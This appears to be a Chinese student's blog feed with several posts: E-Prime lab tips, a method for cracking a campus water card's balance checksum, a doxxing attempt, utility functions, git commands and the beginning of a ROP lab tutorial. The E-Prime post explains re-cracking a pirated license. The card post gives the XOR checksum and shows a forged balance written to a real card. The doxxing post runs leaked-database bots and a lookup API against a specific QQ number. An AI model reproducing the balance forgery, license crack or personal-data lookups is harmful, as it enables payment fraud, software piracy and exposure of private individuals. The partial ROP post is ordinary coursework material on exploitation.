        <tags>
            
            <tag> 浦中 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>eprime实验注意事项</title>
      
      <link href="/archives/e868709.html"/>
      <url>/archives/e868709.html</url>
      
        <content type="html"><![CDATA[<p>z咱就是说，写个注意事项，方便调试程序，还能避免很多问题。这个链接一直都有更新，有问题随时来这里查</p><h4 id="1-开始实验之前记得切换输入法至英文"><a href="#1-开始实验之前记得切换输入法至英文" class="headerlink" title="1.开始实验之前记得切换输入法至英文"></a>1.开始实验之前记得切换输入法至英文</h4><p>不然实验跑起来之后，点击键盘会会弹出输入法</p><h4 id="2-点击空格不能太快"><a href="#2-点击空格不能太快" class="headerlink" title="2.点击空格不能太快"></a>2.点击空格不能太快</h4><p>因为记录RT(Response Time)是从麦克风图标出现后才开始记录的，如果受试在麦克风图标出现之前就点击，则会记录不上RT，这种情况在视觉刺激组特别容易出现，可能需要提醒受试。</p><h4 id="3-系统录音机打开方式"><a href="#3-系统录音机打开方式" class="headerlink" title="3.系统录音机打开方式"></a>3.系统录音机打开方式</h4><p>点一下Win图标或者Win键</p><p><img src="https://s2.loli.net/2022/05/02/KdX7CqkSHnVoWgi.png"></p><p>搜索 “ voice ” </p><p><img src="https://s2.loli.net/2022/05/02/atfvRqMLo5uF76p.png"></p><p>打开即可（录音机打开又一点点慢，需要耐心）</p><h4 id="4-强制终端实验方法"><a href="#4-强制终端实验方法" class="headerlink" title="4.强制终端实验方法"></a>4.强制终端实验方法</h4><p>Ctrl + Alt + Shift，这样子中断实验会导致数据记录不上</p><h4 id="5-实验结束后要收集的数据"><a href="#5-实验结束后要收集的数据" class="headerlink" title="5.实验结束后要收集的数据"></a>5.实验结束后要收集的数据</h4><p>如图，在程序文件夹下：</p><p><img src="https://s2.loli.net/2022/05/02/e5LM3yECDnRawUf.png"></p><p>每次做完一个人，最好就把这俩份东西拷贝出来，然后再删掉原来的这两个，再进行下一个实验，否则如果实验者输错序号会把数据覆盖掉的，，，</p><h4 id="6-实验前给受试分配好编号，并监督受试输入正确的编号"><a href="#6-实验前给受试分配好编号，并监督受试输入正确的编号" class="headerlink" title="6.实验前给受试分配好编号，并监督受试输入正确的编号"></a>6.实验前给受试分配好编号，并监督受试输入正确的编号</h4><p>这样能防止数据与人的录音不匹配</p><h4 id="7-运行EPrimer出现“Your-system-is-in-violation-of-the-license-agreement”错误"><a href="#7-运行EPrimer出现“Your-system-is-in-violation-of-the-license-agreement”错误" class="headerlink" title="7.运行EPrimer出现“Your system is in violation of the license agreement”错误"></a>7.运行EPrimer出现“Your system is in violation of the license agreement”错误</h4><p><img src="http://cdn.lmark.cc/img/image-20220822022130889.png"></p><p>原因：是破解版到期了，需要重新破解一下</p><p>解决方法：关闭Eprimer，然后打开安装Eprimer的文件夹，双击e-prime2.0.reg</p><p>e-prime2.0.reg</p><p>然后会弹出一个弹窗，点击“是”即可</p><p><img src="http://cdn.lmark.cc/img/image-20220822022149024.png"></p><p>然后再重新双击实验文件开始运行</p>]]></content>
      
      
      
        <tags>
            
            <tag> E-Prime </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>IC卡金额算法破解的一次尝试</title>
      
      <link href="/archives/5e5bd1a8.html"/>
      <url>/archives/5e5bd1a8.html</url>
      
        <content type="html"><![CDATA[<p>时隔快一年，终于想起来要更新IC卡算法破解的第二期了。之前第一篇关于水卡密钥算法的破解那篇博客，还是我高三时候写的了，现在大一了，写出的东西也会不一样了。这次会介绍的详细一点了。</p><p>第一篇博客传送门：<a href="https://ladeng07.github.io/archives/b79c4a06.html">IC卡秘钥算法破解的一次尝试</a>，不过那也只是我高中时候对水卡密钥的理解，现在已经不一样了。OK，现在我来介绍我最近一次，帮别人研究水卡金额的算法的一次尝试，感谢@W提供素材。</p><hr><p><strong>警告：本文仅供学习讨论使用，请勿拿去进行其他不法用途，出什么问题，本人概不负责。</strong></p><hr><h2 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0.前言"></a>0x0.前言</h2><p>本来没打算写金额篇的，因为高中那会，能力有限，还不能很了解金额算法的一些原理。现在大学了，不在高中，数据也拿不到了，也写不了。但是天无绝人之路，感谢**@W<strong>老铁给我提供了数据，让我得以完成水卡算法的第二个部分——</strong>金额篇**</p><h2 id="0x1-数据准备"><a href="#0x1-数据准备" class="headerlink" title="0x1.数据准备"></a>0x1.数据准备</h2><p>这次的数据，可以说是非常的详细，而且数据量也很大。据不完全统计，足足有<strong>78</strong>条金额数据！！！这么大的数据量，给我的破解提供了很大的便利。</p><h2 id="0x2-开始破解算法"><a href="#0x2-开始破解算法" class="headerlink" title="0x2.开始破解算法"></a>0x2.开始破解算法</h2><p>拿到数据后，大概了解了一下数据的分布的格式，发现其格式是非常有规律的，如下：</p><p><img src="https://s2.loli.net/2022/04/18/kSMR6vQ2fUP15hq.png"></p><ul><li>前面四位是存储金额的地方，理论最大值是FFFF，也就是655.35元。</li><li>中间四位是刷卡次数</li><li>后面四位是校验位，也就是本次破解算法的重点</li></ul><p>知道了要破解的数据后，就到了分析数据的环节，这时候就需要大量的数据了：</p><p><img src="https://s2.loli.net/2022/04/18/ZifpqkOa6Mn2RlB.png"></p><p>密密麻麻的数据（晕），这次的数据比较规整，这很利于我们进行数据分析。还记得当时，上C艹课的时候，太无聊了，就在研究这个数据，当时的我还是抱着之前密钥算法破解的思维来尝试破解这个金额算法，这个思维有好处，也有坏处。好处就是我很容易就知道从哪里入手分析，坏处就是，看问题不够全面。不过这些都是正常问题啦。OK，回到主题。</p><p>我一开始发现的是后四位的第二位和第四位数字的和，是一个<strong>定值——8</strong>，例如：</p><blockquote><p><strong>9147 ：1 + 7 &#x3D; 8</strong></p><p><strong>894F：9 + F &#x3D; 24 mod 16 &#x3D; 8</strong></p><p><strong>6E6A：E + A &#x3D; 24 mod 16 &#x3D; 8</strong></p></blockquote><p>可以看到，第二位和第四位的值之和都是八（24去求余之后就是8），这样，我们只要知道了第二位的算法，第四位也就可以算出来了。四舍五入，就相当于我们已经搞定了一位的算法了（虽然还不知道第二位怎么得出来的）。这次开局很容易，我就知道了第四位算法，但是接下来得破解工作，就没有这么容易了。</p><p>现在还有三位需要破解，因为第四位是由第二位决定的，所以我猜测第三位可能是由第一位决定的（现在看来不完全对）。在前面的48条数据中，可以看到后四位是当金额变化了四次，才变化一次，<img src="https://s2.loli.net/2022/04/26/ojpnGrtQDSPHz1Y.png"></p><p>而且很多重复出现的。然后我开始找第一位和第三位的对应关系，然后真的找出了一张映射表，</p><p><img src="https://s2.loli.net/2022/04/26/ctwGFNIdmUPapO1.png"></p><p>看着这熟悉的变化规律，仿佛之前在密钥算法破解里面见过类似的算法，只要找到什么东西决定第三位是否用进位，然后再找出什么决定第一位，就可以破解出算法了。然而，这个传统的思路虽然看起来很直观，但是，太繁琐了，我隐隐感觉水卡真正的密钥算法应该是非常简洁明了的，破解工作又暂时陷入了僵局。</p><h2 id="0x3-突破瓶颈"><a href="#0x3-突破瓶颈" class="headerlink" title="0x3.突破瓶颈"></a>0x3.突破瓶颈</h2><p>破解的转折点源自于开始破解工作开始的第二天晚上，那是一个星期五（不是野人），我去参加了社团的系统维护课，课上，讲解了一些数据校验码的知识。其中，用到了许多异或操作，使得运算出来的结果非常有规律。我突然想到，水卡金额校验位是不是也是通过异或得到的呢？有了思路之后，马上开始着手研究，在尝试了许多组合后，终于让我找到了金额校验位计算的真正规律：</p><p>后四位校验位是由前面的<strong>金额+刷卡次数</strong>异或得来的，具体过程是：</p><p>以84.91这条数据为例，金额为212B，刷卡次数为2920，校验位为A92F</p><p><img src="https://s2.loli.net/2022/04/26/LIlUZMbRmhvGnq5.png"></p><p>首先，将金额和刷卡次数和校验位前两位进行异或：</p><blockquote><p>21^2B^29^20^A9</p><p>&#x3D; AA</p></blockquote><p>可以看到，结果是AA，再对剩余的数据进行相同的操作可以发现，异或的结果都是AA，所以这就破解出来了校验位的前两位。</p><p>然后，经过观察和尝试不难发现，校验位前两位和后两位的和恒为28，所以用A9 与 28进行和校验，可以得出后两位的值</p><p><img src="https://s2.loli.net/2022/04/26/arIpmnAVzcy7w8q.png"></p><p>至此，整个金额校验位的算法就破解完毕了，接下来要做的就是实践一下。</p><h2 id="0x4-金额模拟"><a href="#0x4-金额模拟" class="headerlink" title="0x4.金额模拟"></a>0x4.金额模拟</h2><p>按照上面的方法，我们来随便模拟一个金额写入，比如132.00元，首先13200转换16进制为0x3390</p><p><img src="https://s2.loli.net/2022/04/26/ROXJQVxjy6sFmY8.png"></p><p>然后，刷卡次数我们可以随便设置，这里我就设置成0000吧。这时候，按照上面的方法，用<strong>金额^刷卡次数^AA</strong>，就可以得到校验位的前俩位：</p><p><img src="https://s2.loli.net/2022/04/26/UxTpGbSfnqoYdjD.png"></p><p>前两位是09，再用09与28进行和校验，可以得到</p><p><img src="https://s2.loli.net/2022/04/26/YDJjsKPrvHpbZiu.png"></p><p>后俩位是CF，所以校验位就是09CF，构造一下金额数据</p><p><img src="https://s2.loli.net/2022/04/26/rR4fgViENIePUqK.png"></p><p>然后写入卡中去测试一下</p><p><img src="https://s2.loli.net/2022/04/26/7tDuQo69karVXn5.jpg" alt="img"></p><p>可以看到，模拟金额成功了，说明这个算法是正确的呢</p><h2 id="0x5-总结"><a href="#0x5-总结" class="headerlink" title="0x5.总结"></a>0x5.总结</h2><p>和之前的密钥破解比起来，这次的金额校验位算法破解似乎更简单了，因为现在的我和当初的我不一样了，有那么一点点进步了，所以写这篇文章记录一下。我发现，对于这些M1卡，似乎最常用到的就是<strong>异或</strong>操作，如果实在没思路，随便尝试异或几个数也是不错的选择呢。</p>]]></content>
      
      
      
        <tags>
            
            <tag> RFID </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>记录一次和键盘侠的正面硬刚（利用社工库+某些接口）</title>
      
      <link href="/archives/36147050.html"/>
      <url>/archives/36147050.html</url>
      
        <content type="html"><![CDATA[<p>本来这几天都没啥时间和心思写博客的，但是呀这几天发生了一些有意思的事，让我有了写博客的素材（其实还是我自己想写辣XD）。</p><p>就是，前两天，在高中的表白墙下面有一个牛马（这不是我骂人，是它本来的ID就是🐂🐎），在那里骂人，我呢，和几个同学在那里输出DK它。</p><p>然后，我方一号输出——军委主席LYG，一鼓作气扛起了输出的大旗，给了对方精确的打击，对方急眼了，遂在评论区下和军委主席互相输出，但是它文化水平，可能不够高。</p><p>脏话，人身攻击啥的一大堆，非常恶心，这时表白墙君（以下简称墙）看不下去了，遂删评。然而，那个牛马并不死心，在墙的最新一条动态下，直接对易烊千玺进行了人身攻击。</p><p>军委主席看不下去，遂开始冲锋。在主席带领下，我们九班势力开始冲击这个牛马。</p><p>而我，刚好最近这几天有稍微研究研究<strong>社工库</strong>的一些东西，所以打算利用社工库来搞这个牛马一波，于是便有了这篇博客。</p><h4 id="1-利用社工库进行QQ反查SJH"><a href="#1-利用社工库进行QQ反查SJH" class="headerlink" title="1. 利用社工库进行QQ反查SJH"></a>1. 利用社工库进行QQ反查SJH</h4><p>这个牛马的QQ，看了一下，只有一颗星（也就是一级）看起来是小号，不过也可能是隐藏了等级信息之类的，因为它设置了不可被搜索到，所以得用一个接口才能查询到它的资料：<a href="http://api.avak.cn/fqq/?qq=430892126">http://api.avak.cn/fqq/?qq=430892126</a></p><p><img src="https://s2.loli.net/2022/05/10/aKJY4DlS7skjRcg.png"></p><p>想要从这个QQ号找到一些信息，先从社工库入手。</p><p>首先呢，打开TG，找到红鼻子bot，发送想要查询的字段，就能查询到结果了：</p><p><img src="https://s2.loli.net/2022/05/10/ZWqX1Dz3sVjg5nO.png"></p><h4 id="2-通过手机号查询相关信息"><a href="#2-通过手机号查询相关信息" class="headerlink" title="2.通过手机号查询相关信息"></a>2.通过手机号查询相关信息</h4><p>可以看到，查到了一个绑定的手机号，但是。由于社工库中被泄露的Q绑，可能是很久之前的了，真实性也许不高，所以还得验证一下这个手机号是不是那个牛马用过或者曾经用过的。</p><p>查询一下这个手机号的一些关联信息</p><p><img src="https://s2.loli.net/2022/05/10/k5NK8Mbwt1SH6Z4.png"></p><p><img src="https://s2.loli.net/2022/05/10/Yz3aq9vmjngxCR6.png"></p><p>可以看到，这个手机号应该也很久没有使用了，应该不是牛马现在正在使用的手机号，想要知道现绑，可以通过忘记密码来看看手机号某几位：</p><p><img src="https://s2.loli.net/2022/05/10/LfA5JCBTKV8h6yv.png"></p><p>看来，查出来的只是旧绑而已，现绑是很难查出来了。</p><p>唯一的办法，只能假定这个牛马是我们高中毕业的，然后从高中的资料里看能不能找到这个手机号。</p><p>哎，不过这个可能性太低了，基本很难找出来。因为QQ的信息太少了。</p><p><img src="https://s2.loli.net/2022/05/10/1GgJIVrXjeNhqQo.png"></p><p>连红鼻子都说查不出什么东西，看来是真的查不了什么有用的信息了。</p><p>看来键盘侠嘴炮成本真的是非常低，把资料隐藏起来，咱就很难找到了。骂了人之后，被骂的人也没有什么还手措施，哎。</p><p>真希望我技术和资料能再多一点。</p><h4 id="3-结局"><a href="#3-结局" class="headerlink" title="3.结局"></a>3.结局</h4><p>直到写完这篇博客（2022年5月10日02点07分），我还是没能揪出这个牛马是谁，哎，结果这两天我有同学的同学又被一个小号骚扰，我也没能查出什么信息。不过我会持续搜集信息，争取早日抓到这个牛马。</p>]]></content>
      
      
      
        <tags>
            
            <tag> QQ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>我的一些常用的工具函数（持续更新）</title>
      
      <link href="/archives/cfb06458.html"/>
      <url>/archives/cfb06458.html</url>
      
        <content type="html"><![CDATA[<p>之前写的一些有意思的函数，因为每次自己再敲一遍又很麻烦，故写好了可以直接复制就可以用了</p><h4 id="1-跑跑弱口令字典"><a href="#1-跑跑弱口令字典" class="headerlink" title="1.跑跑弱口令字典"></a>1.跑跑弱口令字典</h4><p>之前一个课上用的，字典是从github上找的：<a href="https://github.com/fuzz-security/SuperWordlist">https://github.com/fuzz-security/SuperWordlist</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="literal">False</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;MidPwds.txt&quot;</span>, <span class="string">&quot;r&quot;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        line = line.strip(<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">        <span class="keyword">if</span> line == pwd:</span><br><span class="line">            flag = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h4 id="2-发邮件函数"><a href="#2-发邮件函数" class="headerlink" title="2.发邮件函数"></a>2.发邮件函数</h4><p>自己封装了个发邮件函数，写一些自动化任务可能会用到</p><p>需要的参数：</p><ul><li>邮箱</li><li>邮箱TOKEN</li></ul><p>需要用到的库：</p><ul><li>smtplib</li><li>email.mime.text</li><li>email.utils</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#需要用到的库</span></span><br><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"><span class="keyword">from</span> email.mime.text <span class="keyword">import</span> MIMEText</span><br><span class="line"><span class="keyword">from</span> email.utils <span class="keyword">import</span> formataddr</span><br><span class="line"><span class="comment"># text 是你需要发送的内容，email 是邮箱，可以传入一个或者一堆</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">email</span>(<span class="params">text,email</span>):</span><br><span class="line">    my_sender = <span class="string">&#x27;你的邮箱&#x27;</span></span><br><span class="line">    my_pass = <span class="string">&quot;邮箱TOKEN&quot;</span></span><br><span class="line">    msg=MIMEText(text,<span class="string">&#x27;plain&#x27;</span>,<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    msg[<span class="string">&#x27;Subject&#x27;</span>]=<span class="string">&quot;这是一个主题&quot;</span></span><br><span class="line">    msg[<span class="string">&#x27;From&#x27;</span>]=formataddr([<span class="string">&quot;我是发件人&quot;</span>,my_sender])  <span class="comment"># 括号里的对应发件人邮箱昵称、发件人邮箱账号</span></span><br><span class="line">    msg[<span class="string">&#x27;To&#x27;</span>]=formataddr([<span class="string">&quot;我是收件人&quot;</span>,email])              <span class="comment"># 括号里的对应收件人邮箱昵称、收件人邮箱账号</span></span><br><span class="line">     </span><br><span class="line">    <span class="comment"># QQ邮箱的smtp服务器：smtp.qq.com   端口 465</span></span><br><span class="line">    <span class="comment"># 163邮箱smtp服务器 smtp.163.com 端口 25</span></span><br><span class="line">    server=smtplib.SMTP(<span class="string">&quot;smtp.163.com&quot;</span>, <span class="number">25</span>)  <span class="comment"># 发件人邮箱中的SMTP服务器，端口是25</span></span><br><span class="line">    server.login(my_sender, my_pass)  <span class="comment"># 括号中对应的是发件人邮箱账号、邮箱密码</span></span><br><span class="line">    server.sendmail(my_sender,email,msg.as_string())  <span class="comment"># 括号中对应的是发件人邮箱账号、收件人邮箱账号、发送邮件</span></span><br><span class="line">    server.quit()  <span class="comment"># 关闭连接</span></span><br></pre></td></tr></table></figure><h4 id="3-获取B站视频播放量-专栏阅读数和粉丝"><a href="#3-获取B站视频播放量-专栏阅读数和粉丝" class="headerlink" title="3.获取B站视频播放量&#x2F;专栏阅读数和粉丝"></a>3.获取B站视频播放量&#x2F;专栏阅读数和粉丝</h4><p>需要一个参数<strong>UID</strong></p><p>还有需要requests和json库</p><p>返回两个参数:</p><ul><li>fans_data : 粉丝数</li><li>views : 总播放量</li><li>article_views : 专栏阅读量</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,json</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bilibili</span>(<span class="params">UID</span>):</span><br><span class="line">    url1 = <span class="string">&#x27;https://api.bilibili.com/x/space/arc/search?mid=&#x27;</span>+<span class="built_in">str</span>(UID)+<span class="string">&#x27;&amp;ps=30&amp;tid=0&amp;pn=1&amp;keyword=&amp;order=pubdate&amp;jsonp=jsonp&#x27;</span></span><br><span class="line">    url2 = <span class="string">&#x27;https://api.bilibili.com/x/relation/stat?vmid=&#x27;</span>+<span class="built_in">str</span>(UID)+<span class="string">&#x27;&amp;jsonp=jsonp&#x27;</span></span><br><span class="line">    url3 = <span class="string">&quot;https://api.bilibili.com/x/space/article?mid=&quot;</span>+<span class="built_in">str</span>(UID)+<span class="string">&quot;&amp;pn=1&amp;ps=12&amp;sort=view&amp;jsonp=jsonp&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        views_data = json.loads(requests.get(url1).text)[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;list&#x27;</span>][<span class="string">&#x27;vlist&#x27;</span>]</span><br><span class="line">        articles_data = json.loads(requests.get(url3).text)[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;articles&quot;</span>]</span><br><span class="line">        fans_data = json.loads(requests.get(url2).text)[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;follower&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;数据获取失败&quot;</span></span><br><span class="line">    views=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> views_data:</span><br><span class="line">        views+=i[<span class="string">&#x27;play&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    article_views = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> articles_data:</span><br><span class="line">        article_views+=i[<span class="string">&quot;stats&quot;</span>][<span class="string">&quot;view&quot;</span>]</span><br><span class="line">    <span class="keyword">return</span> fans_data,views,article_views</span><br></pre></td></tr></table></figure><p>效果图：</p><p><img src="https://s2.loli.net/2022/04/12/E917W2tOC83XUqb.png"></p><h4 id="4-获取宿舍电量"><a href="#4-获取宿舍电量" class="headerlink" title="4.获取宿舍电量"></a>4.获取宿舍电量</h4>]]></content>
      
      
      
        <tags>
            
            <tag> Tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>一些常用的git命令</title>
      
      <link href="/archives/b076b21a.html"/>
      <url>/archives/b076b21a.html</url>
      
        <content type="html"><![CDATA[<p>记录一些git的用法，怕之后的我给忘了（虽然已经忘记几次了）</p><h3 id="1-克隆仓库"><a href="#1-克隆仓库" class="headerlink" title="1.克隆仓库"></a>1.克隆仓库</h3><p>克隆之前，先新建一个文件夹，进入后右键打开git bash，初始化git</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init  #初始化仓库</span><br></pre></td></tr></table></figure><p>然后就可以直接克隆仓库辣</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone URL    克隆仓库</span><br></pre></td></tr></table></figure><p>之后可以直接pull下来,获取最新版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull 本地与服务器端同步</span><br></pre></td></tr></table></figure><h3 id="2-上传"><a href="#2-上传" class="headerlink" title="2.上传"></a>2.上传</h3><p>在上传到服务器之前，需要先提交到本地仓库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -am &quot;init&quot; 提交并且加注释</span><br></pre></td></tr></table></figure><p>然后就可以推到远程服务器辣</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push origin master 将文件给推到服务器上</span><br></pre></td></tr></table></figure><h3 id="3-其他"><a href="#3-其他" class="headerlink" title="3.其他"></a>3.其他</h3><p>其他一些可能会用到的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git status 查看当前状态</span><br><span class="line"></span><br><span class="line">git log 看你commit的日志</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>网络破防实践先导实验二————ROP攻击</title>
      
      <link href="/archives/7b29b6a8.html"/>
      <url>/archives/7b29b6a8.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h2><p>终于在熬过了第一个实验之后，来到了老师所说的，比第一个简单一点的实验。然而，事实证明，老师在画大饼: (。第二次实验直接让我们利用二进制漏洞对程序进行攻击，拿到Flag。这有多难呢，这次上课在讲解实验的时候，就有好多人退课了，你没听错，上着上着课就退课了他们。不过抛开难度不谈，这次实验确实很有趣，不仅有种打游戏收集成就的感觉，还学到炒鸡多东西（没错，比上一个实验学到太多太多东西了），所以我很快啊，啪的一下就来写博客记录了。</p><h2 id="2-实验概览"><a href="#2-实验概览" class="headerlink" title="2.实验概览"></a>2.实验概览</h2><p>这次实验的主题是二进制漏洞，课上，Aidai学长给我们讲解和演示了如何利用二进制漏洞进行ROP。<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">关于ROP</a>：</p><blockquote><p>ROP(Return Oriented Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong>所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p><ul><li><p>程序存在溢出，并且可以控制返回地址。</p></li><li><p>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</p></li></ul><p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p></blockquote><p>学长主要介绍了**ret2text **和 **ret2libc **两种类型的攻击手段。这次我们攻击的目标是一个Reperter程序。</p><h2 id="3-实验介绍"><a href="#3-实验介绍" class="headerlink" title="3.实验介绍"></a>3.实验介绍</h2><h3 id="0-基础介绍"><a href="#0-基础介绍" class="headerlink" title="0)基础介绍"></a>0)基础介绍</h3><p>在开始讲实验操作之前，先讲点基础知识：</p><h4 id="Pwntools"><a href="#Pwntools" class="headerlink" title="Pwntools"></a>Pwntools</h4><blockquote><ul><li>pwntools是一个CTF框架和漏洞利用开发库 </li><li>用Python开发，旨在让使用者简单快速的编写exploit。 </li><li>文档：<a href="https://docs.pwntools.com/en/latest/">https://docs.pwntools.com/en/latest/</a></li></ul></blockquote><p>这是一个很好用的CTF工具，推荐使用Python2.X版本，会体验比较好。</p><h5 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a><strong>安装方法</strong></h5><p>直接使用pip安装：</p><p><code>pip install pwntools</code></p><h5 id="使用Pwntools"><a href="#使用Pwntools" class="headerlink" title="使用Pwntools"></a>使用Pwntools</h5><p>pwn是一个为CTF优化的工具箱，使用时在脚里直接引入整个包</p><p><code>from pwn import *</code></p><p>此外，还有一个pwnlib模块，这也是一个标准的python模块，使用时需要单独import，如<code>import pwnlib.shellcraft</code></p><p>常见的一些语句：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)  <span class="comment"># 本地process与程序交互</span></span><br><span class="line">r = remote(<span class="string">&quot;XX.XX.XX.XX&quot;</span>,<span class="string">&quot;10104&quot;</span>) <span class="comment"># 远程，两个参数分别是IP和端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 库信息</span></span><br><span class="line">e = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># ELF载入当前程序的ELF，以获取符号表，代码段，段地址，plt，got信息</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"><span class="comment"># 载入libc的库，可以通过vmmap查看</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 首先使用ELF()获取文件的句柄，然后使用这个句柄调用函数，如</span></span><br><span class="line">e = ELF(<span class="string">&#x27;/bin/cat&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(e.address))   <span class="comment"># 文件装载的基地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(e.symbols[<span class="string">&#x27;write&#x27;</span>]))  <span class="comment"># plt表中write函数地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(e.got[<span class="string">&quot;write&quot;</span>]))  <span class="comment"># GOT表中write符号的地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(e.plt[<span class="string">&quot;write&quot;</span>]))  <span class="comment"># PLT表中write符号的地址</span></span><br></pre></td></tr></table></figure><p>关于GOT表和PLT表，简单来说，这两个表是为了程序能够动态链接到外部函数所使用的。存放函数地址的数据表，称为<strong>重局偏移表</strong>（GOT, Global Offset Table），而那个额外代码段表，称为<strong>程序链接表</strong>（PLT，Procedure Link Table）。</p><p>简单来说，GOT表里存的时函数的地址，PLT表存放调用函数的代码，下图的例子比较直观的告诉我们GOT表和PLT表</p><p><img src="https://s2.loli.net/2022/04/05/eqKatAD8vZSldIk.jpg" alt="PLT和GOT原理雏形"></p><p>解释一下，就是当你的程序需要调用外部函数（比如这里的printf和write）时，首先需要先去PLT表里，找到相应的函数代码，然后跳转到相对应的函数的地址，最后在外部库glibc里找到printf和wirte的汇编代码，你的程序才可以执行printf和write。接下来是交互的一些语句：</p><h6 id="1）接收："><a href="#1）接收：" class="headerlink" title="1）接收："></a>1）接收：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 接收</span></span><br><span class="line">r = remote(<span 